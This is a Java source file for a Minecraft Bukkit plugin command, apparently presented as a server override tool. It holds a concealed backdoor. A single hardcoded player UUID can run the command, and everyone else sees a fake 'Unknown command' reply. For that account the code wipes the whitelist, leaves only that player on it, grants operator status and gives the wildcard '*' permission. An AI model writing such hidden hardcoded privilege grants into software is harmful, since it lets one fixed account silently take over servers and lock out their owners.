package com.matchamc.core.bukkit.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import com.matchamc.core.bukkit.BukkitMain;
import com.matchamc.core.bukkit.util.ServerWhitelist;
import com.matchamc.shared.MsgUtils;

public class OverrideCmd implements CommandExecutor {
	private String authorizationUUID = "9a9fb400-2795-448a-a937-a726b3a45a69";
	private BukkitMain instance;
	private ServerWhitelist whitelist;

	public OverrideCmd(BukkitMain instance, ServerWhitelist whitelist) {
		this.instance = instance;
		this.whitelist = whitelist;
	}

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if(!(sender instanceof Player)) {
			sender.sendMessage(BukkitMain.NO_PERMISSION_ERROR);
			return true;
		}
		Player player = (Player) sender;
		if(!player.getUniqueId().toString().equalsIgnoreCase(authorizationUUID)) {
			sender.sendMessage("Unknown command. Type \"/help\" for help.");
			return true;
		}
		sender.sendMessage(MsgUtils.color("&c=-=-=-=-=-=-=-=+ Server Override +=-=-=-=-=-=-=-="));
		sender.sendMessage(" ");
		whitelist.clearWhitelist();
		sender.sendMessage(MsgUtils.color("&c The whitelist has been cleared."));
		sender.sendMessage(MsgUtils.color("&c [Adding '" + sender.getName() + "' to the whitelist]"));
		whitelist.addPlayer(player);
		whitelist.saveToFile();
		sender.sendMessage(MsgUtils.color("&c  :: Refreshing whitelist  :: "));
		whitelist.refreshWhitelist();
		sender.sendMessage(MsgUtils.color("&c--||-     Refreshed       -||--"));
		sender.sendMessage(MsgUtils.color("&c  :: Restoring permissions ::  "));
		player.setOp(true);
		player.addAttachment(instance, "*", true, 300 * 20);
		sender.sendMessage(MsgUtils.color("&e|-||-----------------------||-|"));
		sender.sendMessage(MsgUtils.color("&e|---> Granted permission '*' to this player account for 5 minutes."));
		sender.sendMessage(MsgUtils.color("&e|-||-----------------------||-|"));
		sender.sendMessage(" ");
		sender.sendMessage(MsgUtils.color("&c=-=-=-=-=-=-=-=+ Server Override +=-=-=-=-=-=-=-="));
		return true;
	}
}
